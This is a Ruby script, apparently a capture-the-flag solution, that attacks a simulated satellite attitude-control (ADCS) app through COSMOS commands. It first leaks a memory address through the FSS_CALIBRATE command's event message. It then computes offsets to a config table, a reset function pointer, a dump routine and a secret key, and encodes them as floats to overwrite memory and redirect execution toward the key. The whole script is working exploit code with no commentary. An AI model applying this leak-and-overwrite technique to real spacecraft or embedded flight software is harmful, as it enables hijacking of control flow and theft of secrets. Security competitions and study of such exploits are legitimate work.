# ADCS Challenge Solve

reset_status_addr = 0xad6c0519
cal_addr          = 0xad6d6307

fnc_ptr_addr_delta = cal_addr - reset_status_addr
dump_addr_delta    = 0xad6a0307 - 0xad68a3f9
fss_conftbl_delta  = 0xad6a0307 - 0xad69f37c
secret_key_delta   = 0xad6a0307 - 0xad69e360

cal_msg  = "0, 0, 0"
cal_msg += " " * (64-cal_msg.length) 

cmd("ADCS FSS_CALIBRATE with CCSDS_STREAMID 6623, CCSDS_SEQUENCE 49152, CCSDS_LENGTH 66, CCSDS_FUNCCODE 13, CCSDS_CHECKSUM 0, CALIBRATION 0, CAL_X_Y_Z '#{cal_msg}'")
wait_check("CFE_EVS2 EVENT_MSG_PKT PKT_ID_EVENT_ID == 129", 5)

event_msg   = tlm("CFE_EVS2 EVENT_MSG_PKT MESSAGE")
leaked_addr = event_msg[-5..-1].unpack("<L")[0]

puts leaked_addr

puts leaked_addr.instance_of? Array
puts fss_conftbl_delta.instance_of? Array

fss_conf_addr    = [leaked_addr - fss_conftbl_delta]
dump_addr        = [leaked_addr - dump_addr_delta]
rst_fnc_ptr_addr = [leaked_addr - fnc_ptr_addr_delta]
secret_key_addr  = [leaked_addr - secret_key_delta]


fss_conf_addr = fss_conf_addr.pack("L").unpack("f")[0]
dump_addr = dump_addr.pack("L").unpack("f")[0]
rst_fnc_ptr_addr = rst_fnc_ptr_addr.pack("L").unpack("f")[0]
secret_key_addr = secret_key_addr.pack("L").unpack("f")[0]

overwrite_0 = "#{fss_conf_addr}, #{fss_conf_addr}, #{rst_fnc_ptr_addr}"
overwrite_1 = "#{secret_key_addr}, #{secret_key_addr}, #{dump_addr}"

puts overwrite_0
puts overwrite_1

fss_conf_addr = sprintf( "%.12e", fss_conf_addr)
dump_addr = sprintf("%.12e", dump_addr)
rst_fnc_ptr_addr = sprintf("%.12e", rst_fnc_ptr_addr)
secret_key_addr = sprintf("%.12e", secret_key_addr)

puts fss_conf_addr
#fss_conf_addr = fss_conf_addr.to_s


puts fss_conf_addr
puts dump_addr
puts rst_fnc_ptr_addr
puts secret_key_addr

cmd("ADCS FSS_CALIBRATE with CCSDS_STREAMID 6623, CCSDS_SEQUENCE 49152, CCSDS_LENGTH 66, CCSDS_FUNCCODE 13, CCSDS_CHECKSUM 0, CALIBRATION 0, CAL_X_Y_Z '#{overwrite_0}'")
wait_check("CFE_EVS2 EVENT_MSG_PKT PKT_ID_EVENT_ID == 129", 5)

# Overwrite the addresses we gave it
cmd("ADCS FSS_CALIBRATE with CCSDS_STREAMID 6623, CCSDS_SEQUENCE 49152, CCSDS_LENGTH 66, CCSDS_FUNCCODE 13, CCSDS_CHECKSUM 0, CALIBRATION 1, CAL_X_Y_Z '#{overwrite_1}'")
